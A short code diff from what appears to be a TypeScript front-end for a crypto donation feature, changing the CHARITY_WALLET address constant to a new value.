@@ -12,7 +12,7 @@ import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { Loader2, ShieldCheck, AlertCircle, Plus } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 
-const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
+const CHARITY_WALLET = '9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn';
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
